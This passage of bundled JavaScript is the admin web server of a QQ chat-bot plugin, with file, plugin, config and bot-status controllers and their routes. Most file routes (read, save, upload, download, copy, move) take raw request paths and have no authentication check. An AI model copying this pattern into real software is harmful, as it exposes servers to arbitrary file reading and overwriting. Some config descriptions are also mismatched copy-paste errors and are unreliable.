        const node = getDir(path);
        if (node.name.includes(keyword)) {
            if (node.type == 'directory') {
                let tempNode = JSON.parse(JSON.stringify(node));
                delete tempNode.children;
                matchedItems.push(tempNode);
            }
            else {
                matchedItems.push(node);
            }
        }
        if (node.type == 'directory') {
            node.children.forEach(child => {
                traverseTree(child.path);
            });
        }
    }
    traverseTree(dirPath);
    return matchedItems;
}
function filterDirectoryTree(tree, extension) {
    function containsFileWithExtension(node) {
        if (node.type === 'file' && node.name.includes(`${extension}`)) {
            return true;
        }
        if (node.type === 'directory' && node.children) {
            for (const child of node.children) {
                if (containsFileWithExtension(child)) {
                    return true;
                }
            }
        }
        return false;
    }
    if (tree.type === 'directory' && !containsFileWithExtension(tree)) {
        return undefined;
    }
    if (tree.children) {
        tree.children = tree.children.filter(child => {
            const filteredChild = filterDirectoryTree(child, extension);
            return filteredChild !== undefined;
        });
    }
    return tree;
}
function calculateFileSize(filePath) {
    return new Promise((resolve, reject) => {
        stat(filePath, (err, stats) => {
            if (err) {
                reject(err);
            }
            else {
                resolve(stats.isFile() ? stats.size : 0);
            }
        });
    });
}
async function calculateTotalSize(tree) {
    let totalSize = 0;
    async function traverse(node) {
        if (node.type === 'file') {
            const fileSize = await calculateFileSize(node.path);
            totalSize += fileSize;
        }
        else if (node.type === 'directory') {
            for (const child of node.children) {
                await traverse(child);
            }
        }
    }
    for (const node of tree.children) {
        await traverse(node);
    }
    return totalSize;
}
function formatFileSize(size) {
    if (size < 1024)
        return `${size} B`;
    if (size < 1024 * 1024)
        return `${(size / 1024).toFixed(2)} KB`;
    if (size < 1024 * 1024 * 1024)
        return `${(size / (1024 * 1024)).toFixed(2)} MB`;
    return `${(size / (1024 * 1024 * 1024)).toFixed(2)} GB`;
}

class FsController {
    async listDir(ctx) {
        const { path } = ctx.request.query;
        const dirInfo = getDir(path == 0 ? botInfo.WORK_PATH : path);
        ctx.body = {
            code: 200,
            message: 'ok',
            data: dirInfo
        };
    }
    async touch(ctx) {
        const { path } = ctx.request.query;
        writeFileSync(path, '', 'utf8');
        ctx.body = {
            code: 200,
            message: 'ok',
            data: getDir(path)
        };
    }
    async mkdir(ctx) {
        const { path } = ctx.request.query;
        mkdirSync$1(path);
        ctx.body = {
            code: 200,
            message: 'ok',
            data: getDir(path)
        };
    }
    async readFile(ctx) {
        const { path } = ctx.request.query;
        const content = readFileSync(path, 'utf-8');
        ctx.body = {
            code: 200,
            message: 'ok',
            data: content
        };
    }
    async readMediaFile(ctx) {
        const { path } = ctx.request.query;
        const fileBuffer = readFileSync(path);
        const contentType = mime.getType(path) || 'application/octet-stream';
        ctx.type = contentType;
        ctx.body = fileBuffer;
    }
    async rmFile(ctx) {
        const { path } = ctx.request.query;
        unlinkSync(path);
        const prePath = unlinkedPath(path);
        ctx.body = {
            code: 200,
            message: 'ok',
            data: getDir(prePath)
        };
    }
    async rmDir(ctx) {
        const { path } = ctx.request.query;
        rmSync(path, { recursive: true, force: true });
        const prePath = unlinkedPath(path);
        ctx.body = {
            code: 200,
            message: 'ok',
            data: getDir(prePath)
        };
    }
    async saveFile(ctx) {
        const { path } = ctx.request.query;
        const { content } = ctx.request.body;
        writeFileSync(path, content, 'utf8');
        ctx.body = {
            code: 200,
            message: 'ok',
        };
    }
    async moveFile(ctx) {
        const { path, newPath } = ctx.request.query;
        renameSync(path, newPath);
        ctx.body = {
            code: 200,
            message: 'ok',
            data: getDir(newPath)
        };
    }
    async moveDir(ctx) {
        const { path, newPath } = ctx.request.query;
        renameSync(path, newPath);
        ctx.body = {
            code: 200,
            message: 'ok',
            data: getDir(newPath)
        };
    }
    async renameFile(ctx) {
        const { path, newPath } = ctx.request.query;
        renameSync(path, newPath);
        ctx.body = {
            code: 200,
            message: 'ok',
            data: getDir(newPath)
        };
    }
    async renameDir(ctx) {
        const { path, newPath } = ctx.request.query;
        renameSync(path, newPath);
        ctx.body = {
            code: 200,
            message: 'ok',
            data: getDir(newPath)
        };
    }
    async copyFile(ctx) {
        const { path, newPath } = ctx.request.query;
        copyFileSync$1(path, newPath);
        ctx.body = {
            code: 200,
            message: 'ok',
            data: getDir(newPath)
        };
    }
    async copyDir(ctx) {
        const { path, newPath } = ctx.request.query;
        copyDirectory(path, newPath);
        ctx.body = {
            code: 200,
            message: 'ok',
            data: getDir(newPath)
        };
    }
    async search(ctx) {
        const { path, keyWord } = ctx.request.query;
        const res = fuzzyMatchInDirectoryTree(path, keyWord);
        ctx.body = {
            code: 200,
            message: 'ok',
            data: res
        };
    }
    async upload(ctx) {
        const { path } = ctx.request.body;
        const { filepath, originalFilename } = ctx.request.files.file;
        const newPath = join(path, originalFilename);
        if (!existsSync$1(path)) {
            mkdirSync$1(path, { recursive: true });
        }
        console.log('【micro-plugin】上传文件：');
        console.log(ctx.request.body);
        renameSync(filepath, newPath);
        ctx.body = {
            code: 200,
            message: 'ok',
            data: newPath
        };
    }
    async download(ctx) {
        const { path } = ctx.request.query;
        console.log(path);
        try {
            ctx.set('Content-disposition', `attachment; filename="${basename(path)}"`);
            ctx.set('Content-Type', 'application/octet-stream');
            ctx.body = createReadStream(path);
        }
        catch (error) {
            ctx.body = {
                code: 500,
                message: JSON.stringify(error)
            };
        }
    }
    async getFilesTree(ctx) {
        let { path, ex } = ctx.request.query;
        const node = await getDir(path, null);
        if (!path) {
            path = join(botInfo.WORK_PATH, 'plugins');
        }
        let res = filterDirectoryTree(node, ex) ? node : { children: [] };
        ctx.body = {
            code: 200,
            message: 'success',
            data: Object.assign(res, {
                children: res.children.filter(item => item.type == 'directory' || (item.type == 'file' && item.name.includes(ex)))
            })
        };
    }
    async getFilesSize(ctx) {
        let { path, type } = ctx.request.query;
        const res = (type == 'file') ? await calculateFileSize(path) : (await calculateTotalSize(getDir(path, null)));
        ctx.body = {
            code: 200,
            message: 'success',
            data: formatFileSize(res)
        };
    }
}
var FsController$1 = new FsController();

const redis$3 = await Redis();
class PluginHandler {
    curPlugin;
    pluginsPath;
    indexPath;
    pluginsArr;
    constructor(curPlugin) {
        this.curPlugin = curPlugin;
        this.indexPath = join(botInfo.WORK_PATH, 'data', 'micro-plugin', 'regs.json');
        this.pluginsPath = join(botInfo.WORK_PATH, 'data', 'micro-plugin', 'plugins');
        this.curPlugin = curPlugin;
        this.pluginsArr = [];
    }
    get pluginsKey() {
        return `Micro:Plugins`;
    }
    get pluginsList() {
        return JSON.parse(readFileSync$1(this.indexPath, 'utf-8'));
    }
    set pluginsList(value) {
        writeFileSync$1(this.indexPath, JSON.stringify(value, null, 2), 'utf-8');
    }
    get plugins() {
        return JSON.stringify(this.pluginsArr, null, 2);
    }
    setCurPlugin(value) {
        this.curPlugin = value;
    }
    async setPluginsList(value) {
        writeFileSync$1(this.indexPath, JSON.stringify(value, null, 2), 'utf-8');
        await redis$3.set(this.pluginsKey, JSON.stringify(value));
    }
    async addPlugin(value = null, id = "") {
        if (id !== "") {
            this.curPlugin = value;
        }
        this.pluginsArr = this.pluginsList;
        const pluginPath = join(this.pluginsPath, this.curPlugin.id);
        const { message } = this.curPlugin;
        let newMessage = message.map((item) => {
            switch (item.type) {
                case 'text':
                    break;
                case 'image':
                    if (!existsSync(pluginPath)) {
                        mkdirSync(pluginPath, { recursive: true });
                    }
                    if (!item.url && item.hash && item.data) {
                        item.data = `<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8" /><meta http-equiv="content-type" content="text/html;charset=utf-8" /><title>${item.hash}</title></head>${item.data}</html>`;
                        writeFileSync$1(join(pluginPath, item.hash + '.html'), item.data, 'utf-8');
                        item.data = '';
                        if (item.json) {
                            writeFileSync$1(join(pluginPath, item.hash + '.json'), item.json, 'utf-8');
                            item.json = '';
                        }
                    }
                    break;
                case 'record':
                    if (!existsSync(pluginPath)) {
                        mkdirSync(pluginPath, { recursive: true });
                    }
                    break;
                case 'video':
                    if (!existsSync(pluginPath)) {
                        mkdirSync(pluginPath, { recursive: true });
                    }
                    break;
                case 'face':
                    break;
                case 'poke':
                    break;
                case 'markdown':
                    if (!existsSync(pluginPath)) {
                        mkdirSync(pluginPath, { recursive: true });
                    }
                    if (item.content) {
                        writeFileSync$1(join(pluginPath, 'markdown.json'), JSON.stringify(item.content), 'utf-8');
                        item.content = {};
                    }
                    break;
                case 'button':
                    if (!existsSync(pluginPath)) {
                        mkdirSync(pluginPath, { recursive: true });
                    }
                    if (item.content) {
                        writeFileSync$1(join(pluginPath, 'button.json'), JSON.stringify(item.content), 'utf-8');
                        item.content = {};
                    }
                    break;
                default:
                    Promise.reject(new Error('不支持该类型'));
            }
            return item;
        });
        if (id !== "") {
            let index = this.pluginsArr.findIndex((item) => item.id == id);
            this.pluginsArr[index] = Object.assign(this.curPlugin, { message: newMessage });
        }
        else {
            this.pluginsArr.unshift(Object.assign(this.curPlugin, { message: newMessage }));
        }
        this.setPluginsList(this.pluginsArr);
        return true;
    }
    async deletePlugin(index) {
        this.pluginsArr = this.pluginsList;
        const pluginPath = join(this.pluginsPath, this.pluginsArr[index].id);
        if (existsSync(pluginPath)) {
            rmSync$1(pluginPath, { recursive: true, force: true });
        }
        this.pluginsArr.splice(index, 1);
        this.setPluginsList(this.pluginsArr);
        return true;
    }
    async editorPlugin(id, value) {
        this.addPlugin(value, id);
        return true;
    }
}

class PluginController {
    async getPluginList(ctx) {
        const pluginInstance = new PluginHandler();
        ctx.body = {
            code: 200,
            message: 'success',
            data: pluginInstance.pluginsList
        };
    }
    async setPlugin(ctx) {
        const pluginInstance = new PluginHandler(ctx.request.body);
        pluginInstance.addPlugin();
        ctx.body = {
            code: 200,
            message: 'success',
            data: pluginInstance.pluginsArr
        };
    }
    async deletePlugin(ctx) {
        const { index } = ctx.request.query;
        const pluginInstance = new PluginHandler();
        pluginInstance.deletePlugin(index);
        ctx.body = {
            code: 200,
            message: 'success',
            data: pluginInstance.pluginsArr
        };
    }
    async editorPlugin(ctx) {
        const { index } = ctx.request.query;
        const pluginInstance = new PluginHandler();
        pluginInstance.editorPlugin(index, ctx.request.body);
        ctx.body = {
            code: 200,
            message: 'success',
            data: pluginInstance.pluginsArr
        };
    }
    async getImageJson(ctx) {
        const { id, hash } = ctx.request.query;
        const htmlPath = join(botInfo.WORK_PATH, 'data', 'micro-plugin', 'plugins', id, hash + '.json');
        const imageData = readFileSync(htmlPath, 'utf8');
        ctx.body = {
            code: 200,
            message: 'success',
            data: imageData
        };
    }
    async getSegResources(ctx) {
        const plugin = ctx.request.body;
        for (let i = 0; i < plugin.message.length; i++) {
            if (plugin.message[i].type == 'button') {
                const btnJsonPath = join(botInfo.WORK_PATH, 'data', 'micro-plugin', 'plugins', plugin.id, 'button.json');
                plugin.message[i].content = JSON.parse(readFileSync(btnJsonPath, 'utf8'));
            }
            if (plugin.message[i].type == 'markdown') {
                const mdJsonPath = join(botInfo.WORK_PATH, 'data', 'micro-plugin', 'plugins', plugin.id, 'markdown.json');
                plugin.message[i].content = JSON.parse(readFileSync(mdJsonPath, 'utf8'));
            }
        }
        ctx.body = {
            code: 200,
            message: 'success',
            data: plugin
        };
    }
}
var PluginController$1 = new PluginController();

const require = createRequire(import.meta.url);
const robot = await Bot();
const redis$2 = await Redis();
async function getBotInfo(selfId) {
    const botList = _getBotList(selfId);
    const dataPromises = botList.map(async (i) => {
        const bot = robot[i];
        if (!bot?.uin)
            return false;
        const { nickname = "未知", status = 11, apk, version } = bot;
        const avatarUrl = bot.avatar ?? (Number(bot.uin) ? `https://q1.qlogo.cn/g?b=qq&s=0&nk=${bot.uin}` : "default");
        const verKey = "version";
        const platform = apk
            ? `${apk.display} v${apk[verKey]}`
            : version?.version ?? "未知";
        const messageCount = await getMessageCount(bot);
        const countContacts = getCountContacts(bot);
        const botRunTime = formatDuration(Date.now() / 1000 - bot.stat?.start_time, "dd天hh:mm:ss", true);
        const botVersion = version
            ? `${version.name}${apk ? ` ${version.version}` : ""}`
            : `ICQQ v${require("icqq/package.json").version}`;
        return {
            avatarUrl,
            nickname,
            botRunTime,
            status,
            platform,
            botVersion,
            messageCount,
            countContacts
        };
    });
    return Promise.all(dataPromises).then(r => r.filter(Boolean));
}
async function getMessageCount(bot) {
    const nowDate = moment().format("MMDD");
    const keys = [
        `Yz:count:send:msg:bot:${bot.uin}:total`,
        `Yz:count:receive:msg:bot:${bot.uin}:total`,
        `Yz:count:send:image:bot:${bot.uin}:total`,
        `Yz:count:screenshot:day:${nowDate}`
    ];
    const values = await redis$2.mGet(keys) || [];
    const sent = values[0] || bot.stat?.sent_msg_cnt || 0;
    const recv = values[1] || bot.stat?.recv_msg_cnt || 0;
    const screenshot = values[2] || values[3] || 0;
    return {
        sent,
        recv,
        screenshot
    };
}
function getCountContacts(bot) {
    const friend = bot.fl?.size || 0;
    const group = bot.gl?.size || 0;
    const groupMember = Array.from(bot.gml?.values() || []).reduce((acc, curr) => acc + curr.size, 0);
    return {
        friend,
        group,
        groupMember
    };
}
function _getBotList(selfId) {
    let BotList = [selfId];
    if (Array.isArray((robot)?.uin)) {
        BotList = robot.uin;
    }
    else if (robot?.adapter && robot.adapter.includes(selfId)) {
        BotList = robot.adapter;
    }
    return BotList;
}

class InfoController {
    async botInfo(ctx) {
        const botInfo = await getBotInfo(Cfg$1.qq);
        ctx.body = {
            code: 200,
            message: 'success',
            data: botInfo
        };
    }
    async botURI(ctx) {
        ctx.body = {
            code: 200,
            message: 'success',
            data: path2URI()
        };
    }
}
var InfoController$1 = new InfoController();

const bot$3 = {
    "log_level": {
        desc: '日志等级:trace,debug,info,warn,fatal,mark,error,off',
        value: 'info',
        type: 'string'
    },
    "ignore_self": {
        desc: '群聊和频道中过滤自己的消息',
        value: true,
        type: 'boolean'
    },
    "resend": {
        desc: '被风控时是否尝试用分片发送',
        value: false,
        type: 'boolean'
    },
    "sendmsg_error": {
        desc: '发送消息错误时是否通知主人',
        value: false,
        type: 'boolean'
    },
    "restart_port": {
        desc: '重启API端口 仅ksr.js生效',
        value: 27881,
        type: 'number'
    },
    "ffmpeg_path": {
        desc: 'ffmpeg 路径',
        value: null,
        type: 'string',
    },
    "ffprobe_path": {
        desc: 'ffprobe 路径',
        value: null,
        type: 'string'
    },
    "chromium_path": {
        desc: 'chromium其他路径',
        value: null,
        type: 'string'
    },
    "puppeteer_ws": {
        desc: 'puppeteer接口地址',
        value: null,
        type: 'string'
    },
    "puppeteer_timeout": {
        desc: 'puppeteer截图超时时间',
        value: null,
        type: 'string'
    },
    "proxyAddress": {
        desc: '米游社接口代理地址，国际服用',
        value: null,
        type: 'string'
    },
    "online_msg": {
        desc: '上线时给首个主人QQ推送帮助',
        value: true,
        type: 'boolean'
    },
    "online_msg_exp": {
        desc: '上线推送通知的冷却时间',
        value: 86400,
        type: 'number'
    },
    "skip_login": {
        desc: '是否跳过登录ICQQ',
        value: false,
        type: 'boolean'
    },
    "sign_api_addr": {
        desc: '签名API地址(如:http://127.0.0.1:8080/sign?key=114514)',
        value: null,
        type: 'string'
    },
    "ver": {
        desc: '传入的QQ版本(如:8.9.63、8.9.68)',
        value: null,
        type: 'string'
    }
};
const group = {
    "default": {
        "groupGlobalCD": {
            desc: '群聊中所有指令操作冷却时间，单位毫秒,0则无限制',
            value: 0,
            type: 'number'
        },
        "singleCD": {
            desc: '群聊中个人操作冷却时间，单位毫秒',
            value: 1000,
            type: 'number'
        },
        "onlyReplyAt": {
            desc: '是否只仅关注主动@机器人的消息， 0-否 1-是 2-触发用户非主人只回复@机器人的消息及特定前缀的消息，主人免前缀',
            value: 0,
            type: 'number'
        },
        "botAlias": {
            desc: '开启后则只回复@机器人的消息及特定前缀的消息，支持多个',
            value: ['云崽', '云宝'],
            type: 'array',
            subType: 'string'
        },
        "imgAddLimit": {
            desc: '添加表情是否限制  0-所有群员都可以添加 1-群管理员才能添加 2-主人才能添加',
            value: 0,
            type: 'number'
        },
        "imgMaxSize": {
            desc: '添加表情图片大小限制，默认2m',
            value: 2,
            type: 'number'
        },
        "addPrivate": {
            desc: '是否允许私聊添加  1-允许 0-禁止',
            value: 1,
            type: 'number'
        },
        "enable": {
            desc: '只启用功能，配置后只有该功能才响应',
            value: null,
            type: 'boolean'
        },
        "disable": {
            desc: '禁用功能，功能名称,例如：十连、角色查询、体力查询、用户绑定、抽卡记录、添加表情、欢迎新人、退群通知',
            value: ['禁用示例', '支持多个'],
            type: 'array',
            subType: 'string'
        },
    },
    123456: {
        "groupGlobalCD": {
            desc: '群聊中所有指令操作冷却时间，单位毫秒,0则无限制',
            value: 0,
            type: 'number'
        },
        "singleCD": {
            desc: '群聊中个人操作冷却时间，单位毫秒',
            value: 1000,
            type: 'number'
        }
    },
};
const notice = {
    "iyuu": {
        desc: 'IYUU(https://iyuu.cn/)',
        value: null,
        type: 'string'
    },
    "sct": {
        desc: 'Server酱(https://sct.ftqq.com/)',
        value: null,
        type: 'string'
    },
    "feishu_webhook": {
        desc: '飞书自定义机器人Webhook (https://open.feishu.cn/document/client-docs/bot-v3/add-custom-bot)',
        value: null,
        type: 'string'
    },
};
const other = {
    "autoFriend": {
        desc: '是否自动同意加好友 1-同意 0-不处理',
        value: 1,
        type: 'number'
    },
    "autoQuit": {
        desc: 'Server酱(https://sct.ftqq.com/)',
        value: 50,
        type: 'number'
    },
    "masterQQ": {
        desc: '飞书自定义机器人Webhook (https://open.feishu.cn/document/client-docs/bot-v3/add-custom-bot)',
        value: [2330660495],
        type: 'array',
        subType: 'number'
    },
    "disableGuildMsg": {
        desc: '禁用频道功能 true: 不接受频道消息，flase：接受频道消息',
        value: true,
        type: 'boolean'
    },
    "disablePrivate": {
        desc: '禁用私聊功能 true：私聊只接受ck以及抽卡链接（Bot主人不受限制），false：私聊可以触发全部指令，默认false',
        value: false,
        type: 'boolean'
    },
    "disableMsg": {
        desc: '禁用私聊Bot提示内容',
        value: "私聊功能已禁用，仅支持发送cookie，抽卡记录链接，记录日志文件",
        type: 'string'
    },
    "disableAdopt": {
        desc: '禁用私聊Bot提示内容',
        value: ['stoken'],
        type: 'array',
        subType: 'string'
    },
    "whiteGroup": {
        desc: '白名单群，配置后只在该群生效',
        value: null,
        type: 'array',
        subType: 'number'
    },
    "whiteQQ": {
        desc: '白名单qq',
        value: null,
        type: 'array',
        subType: 'number'
    },
    "blackGroup": {
        desc: '黑名单群',
        value: [213938015],
        type: 'array',
        subType: 'number'
    },
    "blackQQ": {
        desc: '黑名单qq',
        value: [528952540],
        type: 'array',
        subType: 'number'
    },
};
const puppeteer$1 = {
    "chromiumPath": {
        desc: 'chromiumPath: C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe',
        value: null,
        type: 'string'
    },
    "puppeteerWS": {
        desc: 'puppeteerWS地址，如: ws://browserless:3000',
        value: null,
        type: 'string'
    },
    "headless": {
        desc: 'headless',
        value: "new",
        type: 'string'
    },
    "args": {
        desc: 'puppeteer启动args，注意args的--前缀',
        value: ['--disable-gpu', '--disable-setuid-sandbox', '--no-sandbox', '--no-zygote'],
        type: 'array',
        subType: 'string'
    },
    "puppeteerTimeout": {
        desc: 'puppeteer截图超时时间',
        value: null,
        type: 'number'
    },
};
const qq = {
    "qq": {
        desc: 'qq账号',
        value: null,
        type: 'number'
    },
    "pwd": {
        desc: '密码，为空则用扫码登录,扫码登录现在仅能在同一ip下进行',
        value: null,
        type: 'string'
    },
    "platform": {
        desc: '1:安卓手机、 2:aPad 、 3:安卓手表、 4:MacOS 、 5:iPad 、 6:Tim',
        value: 6,
        type: 'number'
    },
};
const redis$1 = {
    "host": {
        desc: 'redis地址',
        value: '127.0.0.1',
        type: 'string'
    },
    "port": {
        desc: 'redis端口',
        value: 6379,
        type: 'number'
    },
    "username": {
        desc: 'redis用户名，可以为空',
        value: null,
        type: 'string'
    },
    "password": {
        desc: 'redis密码，没有密码可以为空',
        value: null,
        type: 'string'
    },
    "db": {
        desc: 'redis数据库',
        value: 0,
        type: 'number'
    },
};
const renderer = {
    "name": {
        desc: '渲染后端, 默认为 puppeteer',
        value: null,
        type: 'string'
    },
};

const userInfo = {
    "avatar": {
        desc: '如果配置优先使用该头像，否则使用第一主人头像，如(https://q1.qlogo.cn/g?b=qq&s=0&nk=2330660495)',
        value: '',
        type: 'string'
    },
    "username": {
        desc: '登录账号',
        value: '',
        type: 'string'
    },
    "password": {
        desc: '登录密码',
        value: '',
        type: 'string'
    },
    "desc": {
        desc: '管理员描述',
        value: '普通管理员',
        type: 'string'
    },
    "routes": {
        desc: '勾选后该模块对此管理员隐藏',
        value: '普通管理员',
        type: 'array',
        subType: 'string'
    },
};

class ConfigController {
    async getBotConfig(ctx) {
        const { name } = ctx.request.query;
        const botCfg = await Cfg$1.getBotConfig(name);
        const defCfg = {
            bot: bot$3,
            notice,
            other,
            puppeteer: puppeteer$1,
            qq,
            redis: redis$1,
            renderer
        };
        let res;
        if (name == 'group') {
            for (const groupKey in botCfg) {
                if (!group[groupKey]) {
                    group[groupKey] = group.default;
                }
                for (const key in botCfg[groupKey]) {
                    if (group[groupKey].hasOwnProperty(key)) {
                        group[groupKey][key].value = botCfg[groupKey][key];
                    }
                }
                res = group;
            }
        }
        else {
            for (const key in botCfg) {
                if (defCfg[name] && defCfg[name].hasOwnProperty(key)) {
                    defCfg[name][key].value = botCfg[key];
                }
            }
            res = defCfg[name];
        }
        ctx.body = {
            code: 200,
            message: 'success',
            data: res
        };
    }
    async setBotConfig(ctx) {
        const { name } = ctx.request.query;
        const data = ctx.request.body;
        const botCfg = new YamlHandler(join(botInfo.WORK_PATH, 'config', 'config', name + '.yaml'));
        const cfgJson = botCfg.jsonData;
        if (name == 'group') {
            for (const groupKey in data) {
                if (!cfgJson[groupKey]) {
                    cfgJson[groupKey] = cfgJson.default;
                }
                for (const key in data[groupKey]) {
                    botCfg.document.setIn([isNaN(Number(groupKey)) ? groupKey : Number(groupKey), key], data[groupKey][key].value);
                }
                botCfg.save();
            }
        }
        else {
            for (const key in data) {
                if (cfgJson.hasOwnProperty(key)) {
                    if (data[key].value === "") {
                        data[key].value = null;
                    }
                    botCfg.set(key, data[key].value);
                }
            }
            botCfg.save();
        }
        ctx.body = {
            code: 200,
            message: 'success',
            data: 'ok'
        };
    }
    async getUserConfig(ctx) {
        const userCfg = (await Cfg$1.getConfig('server')).userInfo;
        const defCfg = userInfo;
        let res = [];
        for (const user of userCfg) {
            for (const key in user) {
                if (defCfg.hasOwnProperty(key)) {
                    defCfg[key].value = user[key];
                }
            }
            res.push(JSON.parse(JSON.stringify(defCfg)));
        }
        ctx.body = {
            code: 200,
            message: 'success',
            data: res
        };
    }
    async setUserConfig(ctx) {
        const data = ctx.request.body;
        const serverCfg = new YamlHandler(join(pluginInfo.ROOT_PATH, 'config', 'config', 'server.yaml'));
        const originalUserInfo = (serverCfg.jsonData).userInfo;
        let userList = data.map((item) => item.username.value);
        originalUserInfo.forEach((user, index) => {
            if (!userList.includes(user.username)) {
                serverCfg.document.deleteIn(['userInfo', index]);
            }
        });
        data.forEach((user, index) => {
            for (const key in user) {
                serverCfg.document.setIn(['userInfo', index, key], user[key].value);
            }
        });
        serverCfg.save();
        ctx.body = {
            code: 200,
            message: 'success',
            data: 'ok'
        };
    }
}
var ConfigController$1 = new ConfigController();

var FSAPI;
(function (FSAPI) {
    FSAPI["LSIT_DIR_URL"] = "/fs/listdir";
    FSAPI["CREATE_URL"] = "/fs/create";
    FSAPI["MKDIR_URL"] = "/fs/mkdir";
    FSAPI["OPEN_URL"] = "/fs/open";
    FSAPI["RM_FILE_URL"] = "/fs/rmfile";
    FSAPI["RM_DIR_URL"] = "/fs/rmdir";
    FSAPI["SAVE_File_URL"] = "/fs/savefile";
    FSAPI["MOVE_File_URL"] = "/fs/movefile";
    FSAPI["MOVE_Dir_URL"] = "/fs/movedir";
    FSAPI["COPY_File_URL"] = "/fs/copyfile";
    FSAPI["COPY_Dir_URL"] = "/fs/copydir";
    FSAPI["RENAME_FILE_URL"] = "/fs/renamefile";
    FSAPI["RENAME_Dir_URL"] = "/fs/renamedir";
    FSAPI["READ_MEDIA_URL"] = "/fs/media";
    FSAPI["SEARCH_URL"] = "/fs/search";
    FSAPI["UPLOAD_URL"] = "/fs/upload";
    FSAPI["DOWNLOAD_URL"] = "/fs/download";
    FSAPI["FITTER_TREE_URL"] = "/fs/filtertree";
    FSAPI["FILES_SIZE_URL"] = "/fs/filesize";
})(FSAPI || (FSAPI = {}));
var PLUGINSAPI;
(function (PLUGINSAPI) {
    PLUGINSAPI["ADD_PLUGIN_URL"] = "/plugins/add";
    PLUGINSAPI["DELETE_PLUGIN_URL"] = "/plugins/delete";
    PLUGINSAPI["PUT_PLUGIN_URL"] = "/plugins/put";
    PLUGINSAPI["GET_PLUGINLIST_URL"] = "/plugins/get";
    PLUGINSAPI["GET_HTML_PROJECT_URL"] = "/plugins/imgJSON";
    PLUGINSAPI["GET_BUTTON_PROJECT_URL"] = "/plugins/btnJSON";
})(PLUGINSAPI || (PLUGINSAPI = {}));
var BOTAPI;
(function (BOTAPI) {
    BOTAPI["LOG_URL"] = "/bot/logs";
    BOTAPI["STATUS_URL"] = "/bot/status";
    BOTAPI["INFO_URL"] = "/bot/info";
    BOTAPI["URI_URL"] = "/bot/URI";
    BOTAPI["SERVER_PORT_URL"] = "/bot/port";
})(BOTAPI || (BOTAPI = {}));
var CONFIGAPI;
(function (CONFIGAPI) {
    CONFIGAPI["GET_BOT_CONFIG_URL"] = "/bot/getcfg";
    CONFIGAPI["SET_BOT_CONFIG_URL"] = "/bot/setcfg";
    CONFIGAPI["GET_PLUGIN_CONFIG_URL"] = "/plugins/getcfg";
    CONFIGAPI["SET_PLUGIN_CONFIG_URL"] = "/plugins/setcfg";
    CONFIGAPI["GET_USER_CONFIG_URL"] = "/user/getcfg";
    CONFIGAPI["SET_USER_CONFIG_URL"] = "/user/setcfg";
})(CONFIGAPI || (CONFIGAPI = {}));
const router = new Router({ prefix: '/api' });
router.post('/login', UserController$1.login);
router.post('/logOut', UserController$1.logOut);
router.get('/user/info', auth, UserController$1.userInfo);
router.get('/user/port', auth, UserController$1.getPort);
router.get(CONFIGAPI.GET_BOT_CONFIG_URL, auth, ConfigController$1.getBotConfig);
router.post(CONFIGAPI.SET_BOT_CONFIG_URL, auth, ConfigController$1.setBotConfig);
router.get(CONFIGAPI.GET_USER_CONFIG_URL, auth, ConfigController$1.getUserConfig);
router.post(CONFIGAPI.SET_USER_CONFIG_URL, auth, ConfigController$1.setUserConfig);
router.get(BOTAPI.LOG_URL, auth, LogController$1.logger);
router.get(BOTAPI.STATUS_URL, StateController$1.sysInfo);
router.get(BOTAPI.INFO_URL, InfoController$1.botInfo);
router.get(BOTAPI.URI_URL, InfoController$1.botURI);
router.post(PLUGINSAPI.ADD_PLUGIN_URL, PluginController$1.setPlugin);
router.delete(PLUGINSAPI.DELETE_PLUGIN_URL, PluginController$1.deletePlugin);
router.put(PLUGINSAPI.PUT_PLUGIN_URL, PluginController$1.editorPlugin);
router.get(PLUGINSAPI.GET_PLUGINLIST_URL, PluginController$1.getPluginList);
router.get(PLUGINSAPI.GET_HTML_PROJECT_URL, PluginController$1.getImageJson);
router.post(PLUGINSAPI.GET_BUTTON_PROJECT_URL, PluginController$1.getSegResources);
router.get(FSAPI.CREATE_URL, FsController$1.touch);
router.get(FSAPI.LSIT_DIR_URL, FsController$1.listDir);
router.get(FSAPI.MKDIR_URL, FsController$1.mkdir);
router.get(FSAPI.OPEN_URL, FsController$1.readFile);
router.get(FSAPI.COPY_Dir_URL, FsController$1.copyDir);
router.get(FSAPI.COPY_File_URL, FsController$1.copyFile);
router.get(FSAPI.MOVE_Dir_URL, FsController$1.moveDir);
router.get(FSAPI.MOVE_File_URL, FsController$1.moveFile);
router.get(FSAPI.RENAME_Dir_URL, FsController$1.renameDir);
router.get(FSAPI.RENAME_FILE_URL, FsController$1.renameFile);
router.post(FSAPI.SAVE_File_URL, FsController$1.saveFile);
router.delete(FSAPI.RM_DIR_URL, auth, FsController$1.rmDir);
router.delete(FSAPI.RM_FILE_URL, auth, FsController$1.rmFile);
router.get(FSAPI.READ_MEDIA_URL, FsController$1.readMediaFile);
router.get(FSAPI.SEARCH_URL, FsController$1.search);
router.post(FSAPI.UPLOAD_URL, FsController$1.upload);
router.get(FSAPI.DOWNLOAD_URL, FsController$1.download);
router.get(FSAPI.FITTER_TREE_URL, FsController$1.getFilesTree);
router.get(FSAPI.FILES_SIZE_URL, FsController$1.getFilesSize);

const app = new Koa();
app.use(koaBody({
    multipart: true,
    formidable: {
        uploadDir: join(pluginInfo.ROOT_PATH, 'src', 'server', 'upload'),
        multiples: true,
        keepExtensions: true,
        maxFieldsSize: 4 * 1024 * 1024 * 1024
    }
}));
app.use(router.routes()).use(router.allowedMethods());
app.use(KoaStatic(join(pluginInfo.ROOT_PATH, 'src', 'server', 'static')));
const server = http.createServer(app.callback());

const logger$3 = await Logger();
class MicroWs {
    clients;
    plugins;
    constructor() {
        this.clients = new Map();
        this.plugins = [];
    }
    use(plugin) {
        this.plugins.push(plugin);
    }
    onOpen(ws) {
        logger$3.info(logger$3.blue(`【micro-ws】已连接`));
        const ClientId = v4();
        ws.send(JSON.stringify({ params: ClientId, action: 'meta', type: 'message' }));
        this.clients.set(ClientId, ws);
        ws.on('message', async (message) => {
            logger$3.info(logger$3.blue(`【micro-ws】收到消息：${message}`));
            const data = JSON.parse(message);
            for (let plugin of this.plugins) {
                await plugin(data, {
                    sendMsg: this.sendMsg.bind(this)
                });
            }
        });
        ws.on('close', () => {
            logger$3.info(logger$3.blue(`【micro-ws】已断开连接`));
            this.clients.delete(ClientId);
        });
        ws.on('error', (err) => {
            logger$3.error('【micro-ws】连接错误:', err);
            this.clients.delete(ClientId);
        });
    }
    sendMsg(params, action, type = 'message', clientId = null) {
        if (clientId) {
